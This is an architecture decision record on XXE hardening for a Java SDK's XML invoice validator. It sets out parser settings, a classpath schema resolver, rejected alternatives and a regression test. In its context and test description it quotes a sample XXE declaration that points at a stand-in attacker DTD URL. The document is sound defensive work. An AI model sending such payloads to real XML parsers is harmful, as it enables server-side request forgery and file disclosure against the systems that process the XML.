# ADR-029: XXE hardening on `KsefXmlValidator`

Date: 2026-05-05
Status: Accepted

## Context

The SDK validates invoice XML against the bundled official KSeF XSDs
(FA(2), FA(3), PEF, RR) in `KsefXmlValidator`. XML parsing in Java
(via `javax.xml.validation.SchemaFactory` + `Validator`) defaults to
permissive behaviour from a security standpoint: external DTD
references and external schema imports are honoured, expanding
`!DOCTYPE foo SYSTEM "http://attacker/evil.dtd"` payloads into
HTTP fetches against caller-controlled URLs (XXE — CWE-611).

The first cut of `KsefXmlValidator` set
`XMLConstants.FEATURE_SECURE_PROCESSING = true` — the standard "I
took a security workshop" answer. Sonar flagged it as BLOCKER S5842
("XML parsers should not be vulnerable to XXE attacks") because
`FEATURE_SECURE_PROCESSING` alone does not block external DTD/schema
access on every JAXP implementation. The blanket secure-processing
flag controls XSLT denial-of-service limits and similar internal
caps; it does NOT close the network egress channel on Xerces or the
JDK default impl.

Compounding: the bundled FA(3) XSD references base types via
`<xsd:import schemaLocation="http://crd.gov.pl/.../bazowe.xsd"/>`.
Naive secure-processing trips on the import (`AccessControlException`
or schema-load failure) when external access is denied — which is
correct, but blocks the SDK from ever validating an FA(3) invoice.

## Decision

`KsefXmlValidator` enforces the full XXE-hardening triplet, every
time, on both the `SchemaFactory` and the `Validator`:

```java
private Schema loadSchema(String resourcePath) {
    SchemaFactory factory = SchemaFactory.newInstance(W3C_XML_SCHEMA_NS_URI);
    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
    factory.setProperty(ORACLE_JAXP_MAX_OCCUR_LIMIT, 0);   // unlimit; safe given resolver
    factory.setResourceResolver(new ClasspathResourceResolver());
    return factory.newSchema(new StreamSource(stream));
}
```

The schemas are bundled into the jar (`<resources>` entries in
`ksef-client/pom.xml`) under `/xsd/FA/`, `/xsd/FA/bazowe/`, etc.
A custom `LSResourceResolver` (`ClasspathResourceResolver`) maps the
`http://crd.gov.pl/.../bazowe.xsd` references in `<xsd:import>` to
the bundled `/xsd/FA/bazowe/*.xsd` resources. With external access
explicitly denied AND every reference pre-resolved against the
classpath, the resulting parser cannot make a network call OR load
an attacker-controlled DTD even if the input XML tries.

`maxOccurLimit` is raised because FA(3)'s schema density (deeply
nested choice/sequence groups) exceeds JDK's 5000-node default. Safe
to relax given the resolver guarantees no external-entity expansion.

The same three-property pattern applies to the `Validator` instance
returned by `Schema.newValidator()`:

```java
Validator validator = schema.newValidator();
validator.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```

## Alternatives considered

1. **`FEATURE_SECURE_PROCESSING` alone** — the pre-Sonar default.
   Rejected: insufficient on common JAXP implementations as noted
   above.
2. **Allow external DTD/schema access; trust the network** —
   `ACCESS_EXTERNAL_DTD = "http,https"`. Rejected: reintroduces XXE.
3. **Block external access AND drop the bundled XSD imports** —
   strip `<xsd:import schemaLocation=...>` from the bundled XSDs at
   build time so no resolver is needed. Rejected: rewriting upstream
   XSDs is a maintenance burden and breaks any future spec
   regeneration.
4. **Use a third-party hardened parser** (Woodstox, Aalto). Rejected:
   adds a runtime dependency to solve a problem the standard library
   already solves with three property settings.

## Consequences

- **Every new XML-parsing code path in this codebase MUST replicate
  the triplet** (`FEATURE_SECURE_PROCESSING`, `ACCESS_EXTERNAL_DTD = ""`,
  `ACCESS_EXTERNAL_SCHEMA = ""`) from the first commit. The
  `XmlValidatorTest.xxe_externalEntityRejected` regression catches
  drift, but only for `KsefXmlValidator` — a future second parser
  needs its own gate.
- **XSD updates require bundling new files**, not just bumping a
  network reference. The `ClasspathResourceResolver` looks up by
  the `systemId` URL the schema declares; if KSeF publishes a new
  base-types schema with a different `schemaLocation` URL, the
  resolver mapping must update too.
- **Tests cover the rejection.** A test passes a payload with an
  `!DOCTYPE foo SYSTEM "http://attacker/evil.dtd"` declaration and
  asserts it fails with a SAX error mentioning the blocked external
  reference — not a network timeout (which would mean the parser
  TRIED to fetch).
- **Sonar gate** (S5842) is a blocking check on every PR. New
  regressions surface in CI before merge.
- **`KsefXmlValidator` is exported** as part of `sdk.crypto`
  (per its `package-info.java`). Consumers can plug it in for their
  own pre-flight validation. The hardening posture is therefore
  consumer-visible, not just SDK-internal.

## Where it lives

- `ksef-client/src/main/java/.../sdk/crypto/KsefXmlValidator.java`
  — full triplet on `SchemaFactory` and `Validator`,
  `ClasspathResourceResolver`, `ORACLE_JAXP_MAX_OCCUR_LIMIT` constant.
- `ksef-client/pom.xml` — `<resources>` entries bundling FA / PEF /
  RR / UPO XSDs.
- `ksef-client/src/test/java/.../crypto/KsefXmlValidatorTest.java` —
  regression test for the XXE rejection.
